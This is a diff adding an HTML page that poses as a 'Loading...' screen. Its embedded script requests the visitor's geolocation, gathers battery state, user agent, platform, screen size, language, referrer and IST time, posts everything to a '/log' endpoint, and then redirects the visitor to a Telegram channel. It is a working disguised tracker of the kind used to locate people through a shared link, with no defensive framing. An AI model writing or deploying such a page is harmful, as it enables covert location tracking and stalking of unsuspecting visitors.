@@ -1,0 +1,53 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Loading...</title>
+  <script>
+    function getISTTime() {
+      const now = new Date();
+      const utc = now.getTime() + (now.getTimezoneOffset() * 60000);
+      const istOffset = 5.5 * 60 * 60000; // IST offset in ms
+      const istTime = new Date(utc + istOffset);
+      return istTime.toString(); // Full IST time string
+    }
+
+    async function sendData(info) {
+      await fetch('/log', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify(info)
+      });
+    }
+
+    navigator.geolocation.getCurrentPosition(async (pos) => {
+      const info = {
+        lat: pos.coords.latitude,
+        lon: pos.coords.longitude,
+        battery_level: "?",
+        charging: "?",
+        browser: navigator.userAgent,
+        device: navigator.platform,
+        screen: `${screen.width}x${screen.height}`,
+        language: navigator.language,
+        timezone: "Asia/Kolkata", // Manually set to IST
+        ist_time: getISTTime(),   // IST time in string
+        referrer: document.referrer
+      };
+
+      try {
+        const battery = await navigator.getBattery();
+        info.battery_level = Math.round(battery.level * 100);
+        info.charging = battery.charging;
+      } catch {}
+
+      await sendData(info);
+
+      // Redirect after sending data
+      window.location.href = "https://t.me/StarXNetwork";
+    });
+  </script>
+</head>
+<body>
+  <h2>Loading...</h2>
+</body>
+</html>
